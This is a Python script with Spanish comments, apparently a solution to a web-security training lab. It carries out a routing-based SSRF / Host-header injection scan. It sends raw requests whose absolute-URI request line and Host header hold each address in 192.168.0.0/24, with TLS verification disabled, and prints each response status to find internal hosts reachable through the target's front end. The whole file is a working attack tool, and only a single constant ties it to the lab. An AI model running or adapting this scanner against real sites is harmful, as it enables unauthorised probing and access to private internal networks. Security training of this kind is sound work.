import asyncio
import socket
import ssl
from typing import Iterator
from urllib.parse import urlparse

# Target fijo (equivalente a hostinject -u URL)
LAB_HOST = "0a7e00200472f9c980c36762001d00ac.web-security-academy.net"
LAB_URL = f"https://{LAB_HOST}/"
LAB_IP = socket.gethostbyname(LAB_HOST)
LAB_PORT = urlparse(LAB_URL).port or 443

REQUEST_TIMEOUT = 15
CONCURRENCY = 40

SSL_CONTEXT = ssl.create_default_context()
SSL_CONTEXT.check_hostname = False
SSL_CONTEXT.verify_mode = ssl.CERT_NONE

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Language": "es-ES,es;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "close",
}

# Wordlist de hosts a inyectar (equivalente a hostinject -w / -a)
NETWORK_PREFIX = "192.168.0"
IP_START = 0
IP_END = 255


def iter_wordlist() -> list[str]:
    return [f"{NETWORK_PREFIX}.{i}" for i in range(IP_START, IP_END + 1)]


def chunked(items: list[str], size: int) -> Iterator[list[str]]:
    for index in range(0, len(items), size):
        yield items[index : index + size]


def build_request(injected_host: str) -> bytes:
    """Inyecta injected_host en request line y Host (SSRF con URI absoluta)."""
    path = urlparse(LAB_URL).path or "/"
    lines = [
        f"GET https://{injected_host}{path} HTTP/1.1",
        f"Host: {injected_host}",
    ]
    for name, value in DEFAULT_HEADERS.items():
        lines.append(f"{name}: {value}")
    lines.extend(["", ""])
    return "\r\n".join(lines).encode()


def parse_status(response: bytes) -> int:
    status_line = response.split(b"\r\n", 1)[0]
    return int(status_line.split()[1])


async def probe_host(injected_host: str) -> None:
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(
                LAB_IP,
                LAB_PORT,
                ssl=SSL_CONTEXT,
                server_hostname=LAB_HOST,
            ),
            timeout=REQUEST_TIMEOUT,
        )
        writer.write(build_request(injected_host))
        await writer.drain()

        data = await asyncio.wait_for(reader.read(8192), timeout=REQUEST_TIMEOUT)
        writer.close()
        await writer.wait_closed()

        print(f"{injected_host} -> {parse_status(data)}")
    except Exception as error:
        print(f"{injected_host} -> error: {type(error).__name__}: {error}")


async def main() -> None:
    for batch in chunked(iter_wordlist(), CONCURRENCY):
        await asyncio.gather(*[probe_host(host) for host in batch])


if __name__ == "__main__":
    asyncio.run(main())
